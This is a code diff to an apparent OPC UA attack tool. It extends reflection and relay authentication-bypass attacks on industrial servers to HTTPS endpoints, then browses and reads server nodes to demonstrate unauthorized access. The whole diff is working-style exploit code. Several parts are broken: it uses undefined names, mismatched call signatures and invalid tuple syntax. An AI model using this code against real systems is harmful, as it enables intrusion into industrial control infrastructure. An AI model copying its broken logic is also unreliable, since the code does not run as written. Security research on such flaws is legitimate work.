@@ -1,3 +1,5 @@
+import requests
+
 from messages import *
 from message_fields import *
 from typing import *
@@ -21,12 +23,29 @@ def log_success(msg : str):
 class AttackNotPossible(Exception):
   pass
   
+# Protocols supported for current attacks.
+class TransportProtocol(Enum):
+  TCP_BINARY = auto()
+  HTTPS = auto()
+  
+def proto_scheme(protocol : TransportProtocol) -> str:
+  return {
+    TransportProtocol.TCP_BINARY: "opc.tcp",
+    TransportProtocol.HTTPS     : "https",
+  }[protocol]
+  
 def parse_endpoint_url(url):
-  m = re.match(r'opc\.tcp://(?P<host>[^:/]+):(?P<port>\d+)/', url)
+  m = re.match(r'(?P<scheme>[\w.]+)://(?P<host>[^:/]+):(?P<port>\d+)/', url)
   if not m:
     raise Exception(f'Don\'t know how to process endpoint url: {url}')
   else:
-    return m.group('host', 'port')
+    protos = {
+      "opc.tcp": TransportProtocol.TCP_BINARY,
+      "https"  : TransportProtocol.HTTPS,
+    }
+    if m.group('scheme') not in protos:
+      raise Exception(f'Unsupported protocol: "{m.group("scheme")}" in URL {url}.')
+    return (protos[m.group('scheme')], **m.group('host', 'port'))
 
 # Common routines.
 
@@ -38,8 +57,9 @@ def opc_exchange(sock : socket, request : OpcMessage, response_obj : Optional[Op
     response = response_obj or request.__class__()
     response.from_bytes(sockio)
     return response
-  
-# Sets up the connection, does a plain hello and simply ignores the server's size and chunking wishes.
+    
+
+# Sets up a binary TCP connection, does a plain hello and simply ignores the server's size and chunking wishes.
 def connect_and_hello(host : str, port : int) -> socket:
   sock = create_connection((host,port))
   opc_exchange(sock, HelloMessage(
@@ -145,45 +165,65 @@ def session_exchange(channel : ChannelState,
   resp, _ = respfield.from_bytes(convo.requestOrResponse)
   return resp
   
-# Protocols supported for current attacks.
-class TransportProtocol(Enum):
-  TCP_BINARY = auto()
-  HTTPS = auto()
-  
-# def proto_scheme(protocol : TransportProtocol) -> str:
-  
+# OPC exchange over HTTPS.
+# https://reference.opcfoundation.org/Core/Part6/v105/docs/7.4
+def https_exchange(
+    url : str, nonce_policy : Optional[SecurityPolicy], 
+    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
+    **req_data
+  ) -> NamedTuple:
+  headers = {
+    'Content-Type': 'application/octet-stream',
+  }
+  if nonce_policy is not None:
+    headers['OPCUA-SecurityPolicy'] =  nonce_policy.value
+    
+  reqbody = reqfield.to_bytes(reqfield.create(**req_data))
+  http_resp = requests.post(url, verify=False, headers=headers, data=reqbody)
+  return respfield.from_bytes(http_resp.content)
 
-# Relevant endpoint information.
-@dataclass
-class EndpointInfo:
-  host             : str
-  port             : int
-  certificate      : bytes
-  policy           : SecurityPolicy
-  mode             : MessageSecurityMode
-  accepts_certauth : bool
+# Picks either session_exchange or https_exchanged based on channel type.
+def generic_exchange(
+    chan_or_url : ChannelState | str, nonce_policy : Optional[SecurityPolicy], 
+    reqfield : EncodableObjectField, respfield : EncodableObjectField, 
+    **req_data
+  ) -> NamedTuple:
+    if type(chan_or_url) == ChannelState:
+      return session_exchange(chan_or_url, reqfield, respfield, **req_data)
+    else:
+      assert type(chan_or_url) == str and chan_or_url.startswith('https://')
+      return https_exchange(chan_or_url, nonce_policy, reqfield, respfield, **req_data)
 
 # Request endpoint information from a server.
-def get_endpoints(protocol : TransportProtocol, host : str, port: int) -> List[EndpointInfo]:
-  with connect_and_hello(host, port) as sock:
-    chan = unencrypted_opn(sock)
-    resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
-      requestHeader=simple_requestheader(),
-      endpointUrl=f'opc.tcp://{host}:{port}',
-      localeIds=[],
-      profileUris=[],
+def get_endpoints(ep_url : str) -> List[endpointDescription.Type]:
+  if ep_url.startswith('opc.tcp://'):
+    with connect_and_hello(protocol, host, port) as sock:
+      chan = unencrypted_opn(sock)
+      resp = session_exchange(chan, getEndpointsRequest, getEndpointsResponse, 
+        requestHeader=simple_requestheader(),
+        endpointUrl=ep_url,
+        localeIds=[],
+        profileUris=[],
+      )
+  else:
+    assert(ep_url.startswith('https://'))
+    resp = https_exchange(f'{ep_url.rstrip("/")}/discovery', None, getEndpointsRequest, getEndpointsResponse, 
+        requestHeader=simple_requestheader(),
+        endpointUrl=ep_url,
+        localeIds=[],
+        profileUris=[],
     )
       
-  # Only return endpoints that use the binary protocol.
-  return [ep for ep in resp.endpoints if ep.transportProfileUri.endswith('uabinary')]
+  return resp.endpoints
 
 
+# Performs the relay attack. Channels can be either OPC sessions or HTTPS URLs.
 def execute_relay_attack(
-    imp_chan : ChannelState, imp_endpoint : endpointDescription.Type,
-    login_chan : ChannelState, login_endpoint : endpointDescription.Type
+    imp_chan : ChannelState | str, imp_endpoint : endpointDescription.Type,
+    login_chan : ChannelState | str, login_endpoint : endpointDescription.Type
   ) -> NodeId:
     def csr(chan, client_ep, server_ep, nonce):
-      return session_exchange(chan, createSessionRequest, createSessionResponse, 
+      return generic_exchange(chan, server_ep.securityPolicyUri, createSessionRequest, createSessionResponse, 
         requestHeader=simple_requestheader(),
         clientDescription=client_ep.server,
         serverUri=server_ep.server.applicationUri,
@@ -223,7 +263,7 @@ def execute_relay_attack(
       raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
     
     # Now activate the first session using the signature from the second session.
-    session_exchange(login_chan, activateSessionRequest, activateSessionResponse, 
+    generic_exchange(login_chan, login_endpoint.securityPolicyUri, activateSessionRequest, activateSessionResponse, 
       requestHeader=simple_requestheader(createresp1.authenticationToken),
       clientSignature=createresp2.serverSignature,
       clientSoftwareCertificates=[],
@@ -237,14 +277,14 @@ def execute_relay_attack(
 
 # Demonstrate access by recursively browsing nodes. Variables are read.
 # Based on https://reference.opcfoundation.org/Core/Part4/v104/docs/5.8.2
-def demonstrate_access(chan : ChannelState, authToken : NodeId):
+def demonstrate_access(chan : ChannelState | str, authToken : NodeId):
   max_children = 100
   recursive_nodeclasses = {NodeClass.OBJECT}
   read_nodeclasses = {NodeClass.VARIABLE}
   
   print(repr(viewDescription.default_value))
   def browse_from(root, depth):
-    bresp = session_exchange(chan, browseRequest, browseResponse,
+    bresp = generic_exchange(chan, None, browseRequest, browseResponse,
       requestHeader=simple_requestheader(authToken),
       view=viewDescription.default_value,
       requestedMaxReferencesPerNode=max_children,
@@ -292,51 +332,70 @@ def demonstrate_access(chan : ChannelState, authToken : NodeId):
   log('Tree: ')
   log_success('+ <root>')
   browse_from(NodeId(0, 84), 1)
-  log('Finished browsing.')  
-  
+  log('Finished browsing.') 
 
 # Reflection attack: log in to a server with its own identity.
-def reflect_attack(address : Tuple[str, int]):
-  host, port = address
-  log(f'Attempting reflection attack against opc.tcp://{host}:port/')
-  endpoints = get_endpoints(host, port)
+def reflect_attack(url : str):
+  proto, host, port = parse_endpoint_url(url)
+  log(f'Attempting reflection attack against {url}')
+  endpoints = get_endpoints(proto, host, port)
   log(f'Server advertises {len(endpoints)} endpoints.')
   
-  # Try attack against first endpoint with a NONE policy.
-  none_eps = [ep for ep in endpoints if ep.securityPolicyUri == SecurityPolicy.NONE]
-  if none_eps:
-    target = none_eps[0]
-    thost, tport = parse_endpoint_url(target.endpointUrl)
-    log(f'Targeting {thost}:{tport} with NONE security policy.')
-    with connect_and_hello(thost, tport) as sock1, connect_and_hello(thost, tport) as sock2:
-      mainchan, oraclechan = unencrypted_opn(sock1), unencrypted_opn(sock2)
-      token = execute_relay_attack(oraclechan, target, mainchan, target)
-      log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
-      demonstrate_access(mainchan, token)
+  # Try to attack against the first endpoint with an HTTPS transport and a non-None security policy.
+  https_eps = [ep for ep in endpoints if ep.securityPolicyUri != SecurityPolicy.NONE and ep.transportProfileUri.endswith('https-uabinary')]
+  if https_eps:
+    target = https_eps[0]
+    tproto, thost, tport = parse_endpoint_url(target.endpointUrl)
+    assert tproto == TransportProtocol.HTTPS
+    log(f'Targeting {target.endpointUrl} with {target.securityPolicyUri.name} security policy.')
+    # with connect_and_hello(thost, tport) as sock1, connect_and_hello(thost, tport) as sock2:
+    #   mainchan, oraclechan = unencrypted_opn(sock1), unencrypted_opn(sock2)
+    token = execute_relay_attack(target.endpointUrl, target, target.endpointUrl, target)
+    log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
+    demonstrate_access(mainchan, token)
   else:
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
       
-def relay_attack(source : Tuple[str, int], target : Tuple[str, int]):
-  a2url = lambda addr: f'opc.tcp://{":".join(addr)}/'
-  log(f'Attempting relay from {a2url(source)} to {a2url(target)}')
+def relay_attack(source_url : str, target_url : str):
+  log(f'Attempting relay from {source_url} to {target_url}')
   seps = get_endpoints(*source)
   log(f'Listed {len(seps)} endpoints from {a2url(source)}.')
   teps = get_endpoints(*target)
   log(f'Listed {len(teps)} endpoints from {a2url(target)}.')
   
-  for sep, tep in itertools.product(seps, teps):
-    if sep.securityPolicyUri == tep.securityPolicyUri == SecurityPolicy.NONE:
-      log(f'Trying endpoints {sep.endpointUrl} -> {tep.endpointUrl} (both NONE security policy)')
-      shost, sport = parse_endpoint_url(sep.endpointUrl)
-      thost, tport = parse_endpoint_url(tep.endpointUrl)
-      with connect_and_hello(shost, sport) as ssock, connect_and_hello(thost, tport) as tsock:
-        mainchan, oraclechan = unencrypted_opn(tsock), unencrypted_opn(ssock)
+  # Prioritize HTTPS targets with a non-NONE security policy.
+  sort(teps, key=lambda ep: [not ep.transportProfileUri.endswith('https-uabinary'), spe.securityPolicyUri == SecurityPolicy.NONE])
+  
+  tmpsock = None
+  try:
+    for sep, tep in itertools.product(seps, teps):
+      # Source must be HTTPS and non-NONE.
+      if sep.transportProfileUri.endswith('https-uabinary') and spe.securityPolicyUri != SecurityPolicy.NONE:
+        oraclechan = sep.endpointUrl
+        
+        if tep.transportProfileUri.endswith('https-uabinary'):
+          # HTTPS target.
+          mainchan = tep.endpointUrl
+        elif tep.transportProfileUri.endswith('uatcp-uasc-uabinary') and tep.securityPolicyUri == SecurityPolicy.NONE:
+          # When only a TCP target is available we can still try to spoof a user cert.
+          _, thost, tport = parse_endpoint_url(tep.endpointUrl)
+          tmpsock = connect_and_hello(thost, tport)
+          mainchan = unencrypted_opn(tmpsock)
+        else:
+          continue
+          
+        log(f'Trying endpoints {sep.endpointUrl} ({sep.securityPolicyUri.name})-> {tep.endpointUrl} ({sep.securityPolicyUri.name})')
         token = execute_relay_attack(oraclechan, sep, mainchan, tep)
         log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
         demonstrate_access(mainchan, token)
         return
-  
-  raise AttackNotPossible('TODO: implement combination with OPN attack.')
+    
+    raise AttackNotPossible('TODO: implement combination with OPN attack.')
+  finally:
+    if tmpsock:
+      tmpsock.shutdown(socket.SHUT_RDWR)
+      tmpsock.close()
+      
 
 
 
